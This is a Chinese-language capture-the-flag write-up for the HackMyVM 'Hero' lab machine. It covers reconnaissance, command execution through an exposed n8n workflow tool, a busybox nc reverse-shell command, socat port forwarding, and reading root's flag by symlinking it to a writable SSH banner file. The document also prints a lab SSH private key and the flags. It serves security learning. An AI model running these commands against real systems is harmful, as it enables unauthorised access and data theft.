{"pageProps":{"postData":{"id":"HackMyVMHero","contentHtml":"<h1>Hero.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Hero\">https://hackmyvm.eu/machines/machine.php?vm=Hero</a></p>\n</blockquote>\n<p>Notes : <strong>CTF like. Have fun.</strong></p>\n<h2>信息收集</h2>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># nmap -sP 192.168.56.0/24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-07 02:<span class=\"hljs-number\">55</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00036</span>s latency).\nMAC Address: 0A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.2</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00038</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:9B:DC:<span class=\"hljs-number\">81</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.18</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00030</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:04:<span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">79</span> (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># nmap -sT -min-rate 10000 -p- 192.168.56.18 </span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-07 02:<span class=\"hljs-number\">55</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.18</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.0012</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http\n<span class=\"hljs-number\">5678</span>/tcp <span class=\"hljs-built_in\">open</span>  rrac\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:04:<span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">79</span> (Oracle VirtualBox virtual NIC)\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">16.87</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]                                                                                                                                          \n└─<span class=\"hljs-comment\"># nmap -sT -A -T4 -p 80,5678 192.168.56.18                              </span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-02-07 02:<span class=\"hljs-number\">56</span> EST           \nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.18</span>                                            \nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00056</span>s latency).                                                                                                                               \n                                                                              \nPORT     STATE SERVICE VERSION                                                \n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http    nginx                                                  \n|_http-title: Site doesn<span class=\"hljs-string\">'t have a title (text/html).                          \n5678/tcp open  rrac?                                                          \n| fingerprint-strings:                                                        \n|   GetRequest:                                                                                                                                              \n|     HTTP/1.1 200 OK                                                         \n|     Accept-Ranges: bytes                                                    \n|     Cache-Control: public, max-age=86400                                    \n|     Last-Modified: Fri, 07 Feb 2025 07:53:54 GMT \n...\nMAC Address: 08:00:27:04:19:79 (Oracle VirtualBox virtual NIC)                                                                                               \nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        \nDevice type: general purpose                                                  \nRunning: Linux 4.X|5.X                                                        \nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5               \nOS details: Linux 4.15 - 5.8                                                                                                                                 \nNetwork Distance: 1 hop                                                       \n                                                                              \nTRACEROUTE                                                                    \nHOP RTT     ADDRESS                                                           \n1   0.56 ms 192.168.56.18\n</span></code></pre>\n<p><code>5678</code>是未知端口，<code>80</code>是<code>http</code></p>\n<h2>80 端口</h2>\n<p>访问主页，看着像是<code>ssh</code>的私钥，但是靶机没开启<code>ssh</code>端口</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># curl 192.168.56.18         </span>\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L\nUgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg\nAAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75\nBbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=\n-----END OPENSSH PRIVATE KEY-----\n</code></pre>\n<p>通过<code>base64</code>解码可以得到一个用户名<code>shawa</code></p>\n<p><img src=\"/post-images/HackMyVMHero/image61.png\" alt=\"image.png\"></p>\n<h2>5678 端口</h2>\n<p>访问主页，是了<code>n8n</code> （开源工作流自动化工具）的安装页面</p>\n<p><img src=\"/post-images/HackMyVMHero/image62.png\" alt=\"image.png\"></p>\n<p>我们先随便填点东西安装进去</p>\n<p>安装后寻找可以利用的点，不要忘记还有<code>ssh</code>密钥</p>\n<h2>命令执行</h2>\n<p>在 <code>create Workflow</code>中发现带有命令执行的字样</p>\n<p><img src=\"/post-images/HackMyVMHero/image63.png\" alt=\"image.png\"></p>\n<p>添加<code>Execute Command</code>后，双击进去，出现输入框，测试一下是否能执行命令，成功执行，当前用户是<code>node</code></p>\n<p><img src=\"/post-images/HackMyVMHero/image64.png\" alt=\"image.png\"></p>\n<p>测试一下是否存在<code>nc</code>命令,测试之后提示<code>busybox</code> ，我们再使用通过<code>busybox</code>来执行<code>nc</code></p>\n<p><img src=\"/post-images/HackMyVMHero/image65.png\" alt=\"image.png\"></p>\n<p><code>kali</code>开启监听，并在<code>Command</code>框输入<code>nc</code>反弹<code>shell</code>命令</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># nc -lvp 4444</span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">4444</span> ...\n</code></pre>\n<pre><code class=\"hljs language-python\">busybox nc <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span> <span class=\"hljs-number\">4444</span> -e /<span class=\"hljs-built_in\">bin</span>/sh\n</code></pre>\n<p>然后就能接收到靶机弹回来的<code>shell</code>了</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~]\n└─<span class=\"hljs-comment\"># nc -lvp 4444</span>\nlistening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">4444</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.18</span>: inverse host lookup failed: Host name lookup failure\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.18</span>] <span class=\"hljs-number\">36561</span>\nwhoami\nnode\n</code></pre>\n<h2>靶机信息收集 - 1</h2>\n<pre><code class=\"hljs language-python\">uname -a\nLinux 83ed090ff160 <span class=\"hljs-number\">6.12</span><span class=\"hljs-number\">.11</span>-<span class=\"hljs-number\">0</span>-lts <span class=\"hljs-comment\">#1-Alpine SMP PREEMPT_DYNAMIC 2025-01-24 20:02:52 x86_64 Linux</span>\n\n<span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">1000</span>(node) gid=<span class=\"hljs-number\">1000</span>(node) groups=<span class=\"hljs-number\">1000</span>(node)\n\nip add\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">65536</span> qdisc noqueue state UNKNOWN qlen <span class=\"hljs-number\">1000</span>\n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">4</span>: eth0@if5: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu <span class=\"hljs-number\">1500</span> qdisc noqueue state UP \n    link/ether 02:<span class=\"hljs-number\">42</span>:ac:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">00</span>:02 brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">172.17</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.2</span>/<span class=\"hljs-number\">16</span> brd <span class=\"hljs-number\">172.17</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> eth0\n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>看到<code>.dockerenv</code> 文件，还有<code>ip</code>地址，应该是在<code>docker</code>环境里面，继续信息收集</p>\n<pre><code class=\"hljs language-python\">ls -al\ntotal <span class=\"hljs-number\">76</span>\ndrwxr-xr-x    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">6</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span> .\ndrwxr-xr-x    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">6</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span> ..\n-rwxr-xr-x    <span class=\"hljs-number\">1</span> root     root             <span class=\"hljs-number\">0</span> Feb  <span class=\"hljs-number\">6</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span> .dockerenv\ndrwxr-xr-x    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">22</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">25</span> <span class=\"hljs-built_in\">bin</span>\ndrwxr-xr-x    <span class=\"hljs-number\">5</span> root     root           <span class=\"hljs-number\">340</span> Feb  <span class=\"hljs-number\">7</span> 07:<span class=\"hljs-number\">53</span> dev\n-rwxr-xr-x    <span class=\"hljs-number\">1</span> root     root           <span class=\"hljs-number\">384</span> Feb  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">47</span> docker-entrypoint.sh\ndrwxr-xr-x    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">6</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">15</span> etc\ndrwxr-xr-x    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">22</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">25</span> home\ndrwxr-xr-x    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">50</span> lib\ndrwxr-xr-x    <span class=\"hljs-number\">2</span> root     root          <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">50</span> lib64\ndrwxr-xr-x    <span class=\"hljs-number\">5</span> root     root          <span class=\"hljs-number\">4096</span> Jan  <span class=\"hljs-number\">8</span> <span class=\"hljs-number\">11</span>:04 media\ndrwxr-xr-x    <span class=\"hljs-number\">2</span> root     root          <span class=\"hljs-number\">4096</span> Jan  <span class=\"hljs-number\">8</span> <span class=\"hljs-number\">11</span>:04 mnt\ndrwxr-xr-x    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">4096</span> Jan <span class=\"hljs-number\">22</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">25</span> opt\ndr-xr-xr-x  <span class=\"hljs-number\">148</span> root     root             <span class=\"hljs-number\">0</span> Feb  <span class=\"hljs-number\">7</span> 07:<span class=\"hljs-number\">53</span> proc\ndrwx------    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">50</span> root\ndrwxr-xr-x    <span class=\"hljs-number\">3</span> root     root          <span class=\"hljs-number\">4096</span> Jan  <span class=\"hljs-number\">8</span> <span class=\"hljs-number\">11</span>:04 run\ndrwxr-xr-x    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">50</span> sbin\ndrwxr-xr-x    <span class=\"hljs-number\">2</span> root     root          <span class=\"hljs-number\">4096</span> Jan  <span class=\"hljs-number\">8</span> <span class=\"hljs-number\">11</span>:04 srv\ndr-xr-xr-x   <span class=\"hljs-number\">13</span> root     root             <span class=\"hljs-number\">0</span> Feb  <span class=\"hljs-number\">7</span> 07:<span class=\"hljs-number\">53</span> sys\ndrwxrwxrwt    <span class=\"hljs-number\">2</span> root     root          <span class=\"hljs-number\">4096</span> Jan  <span class=\"hljs-number\">8</span> <span class=\"hljs-number\">11</span>:04 tmp\ndrwxr-xr-x    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">50</span> usr\ndrwxr-xr-x    <span class=\"hljs-number\">1</span> root     root          <span class=\"hljs-number\">4096</span> Jan  <span class=\"hljs-number\">8</span> <span class=\"hljs-number\">11</span>:04 var\n</code></pre>\n<p>没找到可以利用的，应该是个兔子洞（也不一定是），但是我们手里还有<code>ssh</code>密钥，而且也拿到了<code>docker</code>的网段<code>172.17.0.0</code> ，那么<code>docker</code>连接宿主机的<code>ip</code>就是<code>172.17.0.1</code></p>\n<h2>SSH 命令执行</h2>\n<p>通过在<code>workflow</code>搜索<code>ssh</code>，可以找到<code>ssh</code>的版块，也可以进行命令执行</p>\n<p><img src=\"/post-images/HackMyVMHero/image66.png\" alt=\"image.png\"></p>\n<p>我们设置一下参数，点击<code>Create new Credential</code> ，使用上面得到的信息来填写，保存后能看到<code>Connection tested successfully</code></p>\n<p><img src=\"/post-images/HackMyVMHero/image67.png\" alt=\"image.png\"></p>\n<p>然后测试一下命令<code>id</code> ，是<code>shawa</code>用户，命令执行正常</p>\n<p><img src=\"/post-images/HackMyVMHero/image68.png\" alt=\"image.png\"></p>\n<p>那么就是反弹<code>shell</code>了，和上面的步骤一样</p>\n<h2>靶机信息收集 - 2</h2>\n<p>可以看到<code>ip</code>是靶机的<code>ip</code>了</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">1000</span>(shawa) gid=<span class=\"hljs-number\">1000</span>(shawa) groups=<span class=\"hljs-number\">1000</span>(shawa)\n\nip add\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">65536</span> qdisc noqueue state UNKNOWN qlen <span class=\"hljs-number\">1000</span>\n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: eth0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP qlen <span class=\"hljs-number\">1000</span>\n    link/ether 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:04:<span class=\"hljs-number\">19</span>:<span class=\"hljs-number\">79</span> brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.18</span>/<span class=\"hljs-number\">24</span> scope <span class=\"hljs-keyword\">global</span> eth0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::a00:27ff:fe04:<span class=\"hljs-number\">1979</span>/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">3</span>: docker0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc noqueue state UP \n    link/ether 02:<span class=\"hljs-number\">42</span>:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">67</span>:<span class=\"hljs-number\">43</span>:a4 brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">172.17</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">16</span> brd <span class=\"hljs-number\">172.17</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.255</span> scope <span class=\"hljs-keyword\">global</span> docker0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::<span class=\"hljs-number\">42</span>:48ff:fe67:43a4/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">5</span>: vethb3c6e75@if4: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu <span class=\"hljs-number\">1500</span> qdisc noqueue master docker0 state UP \n    link/ether 9a:cf:<span class=\"hljs-number\">45</span>:<span class=\"hljs-number\">46</span>:c8:<span class=\"hljs-number\">62</span> brd ff:ff:ff:ff:ff:ff\n    inet6 fe80::98cf:45ff:fe46:c862/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n       \nuname -a\nLinux hero <span class=\"hljs-number\">6.12</span><span class=\"hljs-number\">.11</span>-<span class=\"hljs-number\">0</span>-lts <span class=\"hljs-comment\">#1-Alpine SMP PREEMPT_DYNAMIC 2025-01-24 20:02:52 x86_64 Linux</span>\n\n</code></pre>\n<h2>UserFlag</h2>\n<p>可以在用户家目录找到<code>userFlag</code></p>\n<pre><code class=\"hljs language-python\">cat user.txt\nHMVOHIMNOTREAL\n</code></pre>\n<h2>获得交互式shell</h2>\n<p>因为我们可以通过<code>n8n</code>来使用<code>ssh</code>密钥登录，那么肯定<code>22</code>端口应该就是在<code>172.17.0.1</code>上监听着</p>\n<p>查看当前主机的监听和网络连接端口，可以看到和我们的猜想一样</p>\n<pre><code class=\"hljs language-python\">busybox netstat -lntup\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\n\ntcp        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">80</span>              <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*               LISTEN      -\ntcp        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">5678</span>            <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*               LISTEN      -\ntcp        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">172.17</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">22</span>           <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*               LISTEN      -\ntcp        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> :::<span class=\"hljs-number\">80</span>                   :::*                    LISTEN      -\ntcp        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> :::<span class=\"hljs-number\">5678</span>                 :::*                    LISTEN      -\n</code></pre>\n<p>通过<code>socat</code>来转发</p>\n<ol>\n<li>\n<p><code>Kali</code>开启<code>web</code>服务器将<code>socat</code>上传至靶机</p>\n</li>\n<li>\n<p>靶机通过<code>socat</code>来实现端口转发</p>\n<pre><code class=\"hljs language-python\">./socat TCP-LISTEN:<span class=\"hljs-number\">2222</span>,fork TCP4:<span class=\"hljs-number\">172.17</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">22</span> &#x26;\n</code></pre>\n<blockquote>\n<p>该命令在本地机器上启动了一个 TCP 端口 <code>2222</code> 的监听，任何连接到 <code>127.0.0.1:2222</code> 的请求都会被转发到 <code>127.0.0.1:22</code>（即本地的 SSH 服务）</p>\n</blockquote>\n</li>\n<li>\n<p><code>netstat</code>验证一下，可以看到<code>2222</code>端口在监听了</p>\n<pre><code class=\"hljs language-python\">busybox netstat -lntup\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">80</span>              <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*               LISTEN      -\ntcp        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">5678</span>            <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*               LISTEN      -\ntcp        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:<span class=\"hljs-number\">2222</span>            <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*               LISTEN      <span class=\"hljs-number\">3271</span>/socat\ntcp        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">172.17</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">22</span>           <span class=\"hljs-number\">0.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span>:*               LISTEN      -\ntcp        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> :::<span class=\"hljs-number\">80</span>                   :::*                    LISTEN      -\ntcp        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> :::<span class=\"hljs-number\">5678</span>                 :::*                    LISTEN      -\n</code></pre>\n</li>\n<li>\n<p>连接<code>SSH</code> ，拿到交互式<code>shell</code> （ps：之前上传的<code>socat</code>不知道为什么应该是太新了，会无法转发，之后上传了一个旧版本就可以正常转发了）</p>\n<pre><code class=\"hljs language-python\">┌──(root㉿kali)-[~/Desktop/test/Hero]\n└─<span class=\"hljs-comment\"># ssh shawa@192.168.56.18 -p 2222 -i id_rsa</span>\nThe authenticity of host <span class=\"hljs-string\">'[192.168.56.18]:2222 ([192.168.56.18]:2222)'</span> can<span class=\"hljs-string\">'t be established.\nED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span>[<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.18</span>]:<span class=\"hljs-number\">2222</span><span class=\"hljs-string\">' (ED25519) to the list of known hosts.\nshawa was here.\nWelcome to Alpine!\n\nThe Alpine Wiki contains a large amount of how-to guides and general\ninformation about administrating Alpine systems.\nSee &#x3C;https://wiki.alpinelinux.org/>.\n\nYou can setup the system with the command: setup-alpine\n\nYou may change this message by editing /etc/motd.\n\nhero:~$ \n\n</span></code></pre>\n</li>\n</ol>\n<h2>提权</h2>\n<p>总之就是很不对劲（通过老们提示），这个位置是<code>ssh</code>的<code>banner</code></p>\n<p><img src=\"/post-images/HackMyVMHero/image69.png\" alt=\"image.png\"></p>\n<p>查看一下<code>banner</code></p>\n<pre><code class=\"hljs language-python\">hero:~$ grep -i <span class=\"hljs-string\">\"banner\"</span> /etc/ssh/sshd_config\n<span class=\"hljs-comment\"># no default banner path</span>\nBanner /opt/banner.txt\n</code></pre>\n<pre><code class=\"hljs language-python\">hero:/opt$ cat banner.txt\nshawa was here.\n</code></pre>\n<p>可以看到我们拥有修改权限</p>\n<pre><code class=\"hljs language-python\">hero:/opt$ ls -al\ntotal <span class=\"hljs-number\">16</span>\ndrw-rw-rwx    <span class=\"hljs-number\">3</span> root     root          <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">6</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span> .\ndrwxr-xr-x   <span class=\"hljs-number\">21</span> root     root          <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">6</span> <span class=\"hljs-number\">10</span>:03 ..\n-rw-rw-rw-    <span class=\"hljs-number\">1</span> root     root            <span class=\"hljs-number\">16</span> Feb  <span class=\"hljs-number\">6</span> <span class=\"hljs-number\">10</span>:09 banner.txt\ndrwx--x--x    <span class=\"hljs-number\">4</span> root     root          <span class=\"hljs-number\">4096</span> Feb  <span class=\"hljs-number\">6</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">14</span> containerd\n</code></pre>\n<h2>RootFlag</h2>\n<p>不用提权了，可以直接通过<code>banner</code>来读取<code>root.txt</code>文件</p>\n<ol>\n<li>\n<p>删除<code>banner.txt</code></p>\n<pre><code class=\"hljs language-python\">hero:/opt$ rm banner.txt\n</code></pre>\n</li>\n<li>\n<p>通过符号链接把<code>root.txt</code>连接到<code>/opt/banner.txt</code></p>\n<pre><code class=\"hljs language-python\">hero:/opt$ ln -s /root/root.txt /opt/banner.txt\n</code></pre>\n</li>\n<li>\n<p>最后通过<code>SSH</code>登录<code>Root</code>用户，显示<code>banner</code></p>\n<pre><code class=\"hljs language-python\">hero:/opt$ ssh root@<span class=\"hljs-number\">172.17</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>\nThe authenticity of host <span class=\"hljs-string\">'172.17.0.1 (172.17.0.1)'</span> can<span class=\"hljs-string\">'t be established.\nED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span><span class=\"hljs-number\">172.17</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span><span class=\"hljs-string\">' (ED25519) to the list of known hosts.\nHMVNOTINPRODLOL\nroot@172.17.0.1'</span>s password:\n</code></pre>\n</li>\n</ol>\n<h2>总结</h2>\n<p>学习到使用<code>socat</code>实现端口转发，以及<code>SSH banner</code></p>","title":"HackMyVM - Hero","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Hero. https://hackmyvm.eu/machines/machine.php?vm=Hero Notes : CTF like. Have fun. 信息收集 5678是未知端口，80是http 80 端口 